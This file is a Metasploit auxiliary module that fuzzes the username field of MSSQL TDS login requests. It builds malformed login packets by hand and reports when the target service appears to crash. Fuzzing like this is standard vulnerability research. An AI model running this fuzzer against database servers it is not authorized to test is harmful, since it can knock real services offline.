##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Fuzzer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'TDS Protocol Login Request Username Fuzzer',
      'Description'    => %q{
        This module sends a series of malformed TDS login requests.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE
    ))
  end

  # A copy of the mssql_login method with the ability to overload each option
  def do_login(opts={})

    @connected = false
    disconnect if self.sock
    connect
    @connected = true

    pkt = ""
    idx = 0
    db = ""

    pkt << [
      0x00000000,   # Dummy size
      opts[:tds_version]    || 0x71000001,   # TDS Version
      opts[:size]           || 0x00000000,   # Size
      opts[:version]        || 0x00000007,   # Version
      opts[:pid]            || rand(1024+1), # PID
      opts[:connection_id]  || 0x00000000,   # ConnectionID
      opts[:flags_opt1]     || 0xe0,         # Option Flags 1
      opts[:flags_opt2]     || 0x03,         # Option Flags 2
      opts[:flags_sql_type] || 0x00,         # SQL Type Flags
      opts[:flags_reserved] || 0x00,         # Reserved Flags
      opts[:timezone]       || 0x00000000,   # Time Zone
      opts[:collation]      || 0x00000000    # Collation
    ].pack('VVVVVVCCCCVV')


    cname = Rex::Text.to_unicode( opts[:cname] || Rex::Text.rand_text_alpha(rand(8)+1) )
    uname = Rex::Text.to_unicode( opts[:uname] || "sa" )
    pname = opts[:pname_raw] || mssql_tds_encrypt( opts[:pname] || "" )
    aname = Rex::Text.to_unicode(opts[:aname] || Rex::Text.rand_text_alpha(rand(8)+1) )
    sname = Rex::Text.to_unicode( opts[:sname] || rhost )
    dname = Rex::Text.to_unicode( opts[:dname] || db )

    idx = pkt.size + 50 # lengths below

    pkt << [idx, cname.length / 2].pack('vv')
    idx += cname.length

    pkt << [idx, uname.length / 2].pack('vv')
    idx += uname.length

    pkt << [idx, pname.length / 2].pack('vv')
    idx += pname.length

    pkt << [idx, aname.length / 2].pack('vv')
    idx += aname.length

    pkt << [idx, sname.length / 2].pack('vv')
    idx += sname.length

    pkt << [0, 0].pack('vv')

    pkt << [idx, aname.length / 2].pack('vv')
    idx += aname.length

    pkt << [idx, 0].pack('vv')

    pkt << [idx, dname.length / 2].pack('vv')
    idx += dname.length

    # The total length has to be embedded twice more here
    pkt << [
      0,
      0,
      0x12345678,
      0x12345678
    ].pack('vVVV')

    pkt << cname
    pkt << uname
    pkt << pname
    pkt << aname
    pkt << sname
    pkt << aname
    pkt << dname

    # Total packet length
    pkt[0,4] = [pkt.length].pack('V')

    # Embedded packet lengths
    pkt[pkt.index([0x12345678].pack('V')), 8] = [pkt.length].pack('V') * 2

    # Packet header and total length including header
    pkt = "\x10\x01" + [pkt.length + 8].pack('n') + [0].pack('n') + [1].pack('C') + "\x00" + pkt

    resp = mssql_send_recv(pkt,opts[:timeout])

    info = {:errors => []}
    info = mssql_parse_reply(resp,info)
    info
  end

  def run
    last_str = nil
    last_inp = nil
    last_err = nil

    cnt = 0
    fuzz_strings do |str|
      # capped at 16-bit lengths
      next if str.length > 65535
      cnt += 1

      if(cnt % 100 == 0)
        print_status("Fuzzing with iteration #{cnt} using #{@last_fuzzer_input}")
      end

      begin
        do_login(:uname => str, :timeout => 0.50)
      rescue ::Interrupt
        print_status("Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}")
        raise $!
      rescue ::Exception => e
        last_err = e
      ensure
        disconnect
      end

      if(not @connected)
        if(last_str)
          print_status("The service may have crashed: method=#{last_inp} string=#{last_str.unpack("H*")[0]} error=#{last_err}")
        else
          print_status("Could not connect to the service: #{last_err}")
        end
        return
      end

      last_str = str
      last_inp = @last_fuzzer_input
    end
  end
end
